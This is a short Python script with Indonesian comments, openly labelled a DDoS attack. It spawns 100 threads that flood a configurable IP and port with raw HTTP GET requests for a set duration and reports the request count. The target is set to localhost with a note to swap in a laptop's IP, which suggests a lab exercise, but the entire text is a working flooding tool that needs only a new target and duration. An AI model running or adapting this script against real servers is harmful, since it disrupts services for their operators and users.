import socket, threading, time  
TARGET_IP   = "127.0.0.1"  # ganti dengan IP laptop
TARGET_PORT = 8080 
NUM_THREADS = 100            # jumlah thread serentak 
DURATION    = 5              # durasi serangan (detik)  
request_count = 0 
stop_flag = False  
def attack():
     global request_count, stop_flag
     while not stop_flag:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(1)
             s.connect((TARGET_IP, TARGET_PORT))
             # Kirim HTTP request minimal
             s.send(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
             s.close()
             request_count += 1
         except:
            pass

if __name__ == "__main__":
    print(f"[*] Memulai serangan DDoS ke {TARGET_IP}:{TARGET_PORT} selama {DURATION} detik...")
    threads = []
    for _ in range(NUM_THREADS):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)
    time.sleep(DURATION)
    stop_flag = True
    for t in threads:
        t.join()
    print(f"[*] Serangan selesai. Total request yang dikirim: {request_count}")

